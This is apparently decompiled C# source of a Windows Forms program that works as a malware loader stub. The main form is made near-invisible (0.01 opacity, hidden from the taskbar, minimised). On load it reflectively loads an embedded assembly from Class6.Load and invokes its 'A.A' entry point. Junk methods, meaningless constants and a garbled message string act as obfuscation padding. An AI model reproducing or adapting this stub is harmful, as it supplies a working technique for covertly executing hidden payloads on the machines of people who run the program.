using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[DesignerGenerated]
public sealed class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(503, 43);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void method_0()
	{
		while (true)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public object method_1()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		new decimal(747573018L);
		new decimal(4366L);
		MessageBox.Show("6!YŽŒLi<d@\\oH'Gm8T,Œ€mŒ`w9n8^DVfH=Še\u007fn`[(j_‘xŒ;\u008d@\\6`nDIF_M43Ž#%\u008f&(’|O(Ly");
		int num = 0;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 598);
		new decimal(8L);
		new decimal(62730L);
		return 42553413;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Assembly.Load(Class6.Load).CreateInstance("A.A"));
		objectValue.GetType().InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), null);
	}

	private void method_2()
	{
		new decimal(6784338L);
		new decimal(90L);
		while (true)
		{
		}
	}

	private void method_3()
	{
		new decimal(322L);
		new decimal(3539870L);
	}
}
